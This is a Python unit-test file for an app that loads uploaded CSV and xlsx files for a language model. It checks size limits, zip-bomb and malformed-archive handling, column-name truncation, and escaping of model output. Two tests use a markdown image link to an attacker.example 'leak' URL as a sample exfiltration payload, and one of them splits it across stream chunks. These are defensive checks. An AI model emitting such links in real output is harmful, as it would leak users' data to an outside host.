import io
import unittest
import zipfile
from unittest import mock

import app


class UploadedFile(io.BytesIO):
    def __init__(self, content: bytes, name: str, size: int | None = None) -> None:
        super().__init__(content)
        self.name = name
        self.size = len(content) if size is None else size


class FileSafetyTests(unittest.TestCase):
    def test_rejects_oversized_upload_before_parsing(self) -> None:
        uploaded = UploadedFile(
            b"column\nvalue\n",
            "data.csv",
            size=app.MAX_UPLOAD_BYTES + 1,
        )

        with self.assertRaisesRegex(ValueError, "10 MB"):
            app.load_dataframe(uploaded)

    def test_rejects_xlsx_with_excessive_expanded_size(self) -> None:
        content = io.BytesIO()
        with zipfile.ZipFile(content, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("xl/worksheets/sheet1.xml", b"x" * 11)
        uploaded = UploadedFile(content.getvalue(), "data.xlsx")

        with mock.patch.object(app, "MAX_XLSX_UNCOMPRESSED_BYTES", 10):
            with self.assertRaisesRegex(ValueError, "expands beyond"):
                app.validate_xlsx_archive(uploaded)

    def test_rejects_malformed_xlsx(self) -> None:
        uploaded = UploadedFile(b"not a zip archive", "data.xlsx")

        with self.assertRaisesRegex(ValueError, "not a valid spreadsheet"):
            app.validate_xlsx_archive(uploaded)

    def test_bounds_column_names_sent_to_the_model(self) -> None:
        name = app.safe_column_name("x" * (app.MAX_COLUMN_NAME_LENGTH + 1))

        self.assertEqual(len(name), app.MAX_COLUMN_NAME_LENGTH)
        self.assertTrue(name.endswith("…"))

    def test_neutralizes_active_markdown_in_model_output(self) -> None:
        output = "![stats](https://attacker.example/leak?value=42) <img src=x>"

        safe_output = app.model_output_to_safe_markdown(output)

        self.assertNotIn("![", safe_output)
        self.assertNotIn("](", safe_output)
        self.assertIn(r"\!\[stats\]", safe_output)
        self.assertIn(r"https\:\/\/attacker\.example", safe_output)
        self.assertIn(r"\<img src\=x\>", safe_output)

    def test_stream_sanitization_is_safe_across_chunk_boundaries(self) -> None:
        chunks = ["!", "[stats](", "https://attacker.example/leak)"]
        captured: list[str] = []

        displayed = "".join(app.safe_model_output_stream(iter(chunks), captured))

        raw_output = "".join(chunks)
        self.assertEqual("".join(captured), raw_output)
        self.assertEqual(displayed, app.model_output_to_safe_markdown(raw_output))


if __name__ == "__main__":
    unittest.main()
